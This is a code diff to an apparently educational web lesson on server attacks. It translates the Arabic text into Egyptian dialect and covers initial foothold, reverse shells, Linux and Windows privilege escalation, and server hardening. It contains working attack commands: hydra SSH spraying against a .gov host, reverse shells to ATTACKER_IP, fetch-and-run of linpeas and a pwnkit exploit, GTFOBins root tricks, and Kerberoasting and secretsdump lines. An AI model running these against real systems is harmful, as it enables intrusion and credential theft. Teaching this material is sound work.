@@ -6,77 +6,77 @@ export default function Page() {
     <LessonShell slug="server-attacks">
       <L
         ar={<>
-          <Section title="من الويب إلى السيرفر — تنفيذ الأوامر">
-            <Analogy>فتحنا الباب الأمامي للمتجر (الويب). الآن نريد الدخول للمستودع الخلفي (السيرفر) ثم لمكتب المدير (root). كل خطوة تتطلب «مفتاحاً» مختلفاً.</Analogy>
+          <Section title="من الويب للسيرفر — وصلنا لتنفيذ الأوامر">
+            <Analogy>فتحنا الباب الأمامي للمحل (الويب). دلوقتي عايزين ندخل المخزن (السيرفر)، و بعدها مكتب المدير (root). كل خطوة فيهم محتاجة "مفتاح" مختلف.</Analogy>
           </Section>
-          <Section title="الوصول الأولي — Initial Foothold">
+          <Section title="Initial Foothold — أول قدم جوة">
             <ul>
-              <li><b>RCE</b> عبر ثغرة ويب (سبق في الدرس السابق).</li>
-              <li><b>SSH brute force / spraying</b>.</li>
+              <li><b>RCE</b> عن طريق ثغرة ويب (اتكلمنا عنها الدرس اللي فات).</li>
+              <li><b>SSH brute force / spraying</b> — اللي عنده passwords ضعيفة بيدفع التمن.</li>
               <li>خدمة قديمة فيها CVE معروفة (Tomcat, Jenkins, GitLab).</li>
-              <li>مفاتيح مسرّبة من GitHub.</li>
+              <li>مفاتيح اتسربت على GitHub — كنز بيتساب مكشوف.</li>
             </ul>
             <Code lang="SSH spray (authorized only)">{`hydra -L users.txt -p 'Summer2026!' ssh://target.gov -t 4 -f
 crackmapexec ssh target.gov -u root -k id_rsa.leaked`}</Code>
           </Section>
-          <Section title="Reverse Shell — قلب الاختراق">
-            <Analogy>الـ firewall يمنع الاتصالات الواردة لكن يسمح بالخارجة. الحل: نجعل السيرفر <b>هو الذي يتصل بنا</b>.</Analogy>
+          <Section title="Reverse Shell — قلب الاختراق كله">
+            <Analogy>الـ firewall بيقفل الـ inbound بس بيسيب الـ outbound. الحل بسيط: خلي السيرفر <b>هو اللي يتصل بينا</b>. قلبنا اللعبة.</Analogy>
             <Code lang="bash">{`# على جهاز المهاجم
 nc -lnvp 4444
 # على الضحية
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("A",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
 busybox nc ATTACKER 4444 -e sh`}</Code>
-            <Callout kind="warn" title="ترقية الـ shell">
+            <Callout kind="warn" title="رقّي الـ shell — متشتغلش على الخام">
               <Code lang="upgrade">{`python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Ctrl-Z
 stty raw -echo; fg
 export TERM=xterm-256color`}</Code>
             </Callout>
           </Section>
-          <Section title="رفع الصلاحيات — Linux Privilege Escalation">
-            <h3>أتمتة الفحص</h3>
+          <Section title="Linux Privilege Escalation — من user لـ root">
+            <h3>أتمتة الفحص — متضيعش وقتك</h3>
             <Terminal lines={[
               { p: "wget http://ATTACKER/linpeas.sh -O /tmp/p.sh && bash /tmp/p.sh" },
               { o: "[+] SUID binaries:\n /usr/bin/find  — exploitable via GTFOBins\n[!] Writable /etc/passwd" },
             ]} />
-            <h3>طرق شائعة لـ root</h3>
+            <h3>السكك المعروفة لـ root</h3>
             <ol>
-              <li><b>SUID binaries</b> — راجع GTFOBins.</li>
-              <li><b>Sudo misconfiguration</b> — sudo -l ثم استغلال.</li>
-              <li><b>Writable /etc/passwd</b> — أضف مستخدماً بكلمة معروفة.</li>
-              <li><b>Cron jobs</b> تشغّل سكربتاً أنت تستطيع تعديله.</li>
-              <li><b>Kernel exploits</b> — DirtyPipe (CVE-2022-0847), Pwnkit (CVE-2021-4034).</li>
-              <li><b>Docker socket</b> — /var/run/docker.sock mounted = root.</li>
-              <li><b>Capabilities</b> — cap_setuid على binary.</li>
+              <li><b>SUID binaries</b> — افتح GTFOBins و ابص.</li>
+              <li><b>Sudo misconfig</b> — اعمل sudo -l الأول، و بعدين استغل.</li>
+              <li><b>Writable /etc/passwd</b> — ضيف يوزر بـ hash معروف و خلاص.</li>
+              <li><b>Cron jobs</b> بتشغل سكربت إنت ممكن تعدله.</li>
+              <li><b>Kernel exploits</b> — DirtyPipe (CVE-2022-0847)، Pwnkit (CVE-2021-4034).</li>
+              <li><b>Docker socket</b> — /var/run/docker.sock مركّب = root على طبق.</li>
+              <li><b>Capabilities</b> — cap_setuid على binary = خلاص.</li>
             </ol>
             <Code lang="GTFOBins examples">{`find . -exec /bin/sh -p \\; -quit
 sudo vim -c ':!/bin/sh'
 curl -sLO https://raw.githubusercontent.com/.../pwnkit.c && gcc pwnkit.c -o pk && ./pk`}</Code>
           </Section>
-          <Section title="رفع الصلاحيات — Windows">
+          <Section title="Windows Privilege Escalation">
             <ul>
-              <li><b>winPEAS</b>، <b>PowerUp.ps1</b>، <b>Seatbelt</b>.</li>
+              <li><b>winPEAS</b>، <b>PowerUp.ps1</b>، <b>Seatbelt</b> — أدواتك الأساسية.</li>
               <li>Unquoted Service Path.</li>
               <li>AlwaysInstallElevated.</li>
-              <li>سرقة الـ tokens بـ Mimikatz / Rubeus.</li>
-              <li>Kerberoasting — استخراج SPN ثم كسر بـ hashcat.</li>
+              <li>سرقة tokens بـ Mimikatz / Rubeus.</li>
+              <li>Kerberoasting — تطلع SPN tickets و تكسرهم بـ hashcat.</li>
             </ul>
             <Code lang="Active Directory">{`GetUserSPNs.py corp.local/user:pass -dc-ip DC -request
 GetNPUsers.py corp.local/ -usersfile users.txt -no-pass
 secretsdump.py -just-dc corp.local/admin@DC`}</Code>
           </Section>
-          <Section title="الدفاع: Server Hardening">
+          <Section title="الدفاع: Server Hardening — قفل البيت">
             <ol>
-              <li>SSH: فقط مفاتيح، fail2ban، 2FA.</li>
-              <li>إزالة كل SUID غير الضروري.</li>
-              <li>تطبيق CIS Benchmarks.</li>
-              <li>تفعيل auditd + شحن السجلات لـ SIEM.</li>
-              <li>EDR مثل Wazuh / CrowdStrike / Defender for Endpoint.</li>
-              <li>AppArmor / SELinux في وضع enforcing.</li>
-              <li>تقسيم الشبكة لمنع الـ lateral movement.</li>
+              <li>SSH: مفاتيح بس، fail2ban، 2FA. مفيش passwords.</li>
+              <li>اقلع أي SUID مش محتاجه.</li>
+              <li>طبّق CIS Benchmarks — مش زينة، ضرورة.</li>
+              <li>فعّل auditd و ابعت اللوجز للـ SIEM.</li>
+              <li>EDR زي Wazuh / CrowdStrike / Defender for Endpoint.</li>
+              <li>AppArmor / SELinux على enforcing — مش permissive.</li>
+              <li>قسّم الشبكة (microsegmentation) عشان تقفل سكة الـ lateral movement.</li>
             </ol>
-            <Callout kind="info" title="قاعدة 1-10-60">CrowdStrike: اكتشاف خلال 1 دقيقة، تحقق خلال 10 دقائق، احتواء خلال 60 دقيقة.</Callout>
+            <Callout kind="info" title="قاعدة 1-10-60">CrowdStrike قالوها: اكتشف في دقيقة، حقق في 10 دقايق، احتوي في 60 دقيقة. اللي بياخد أكتر من كده بيخسر.</Callout>
           </Section>
         </>}
         en={<>
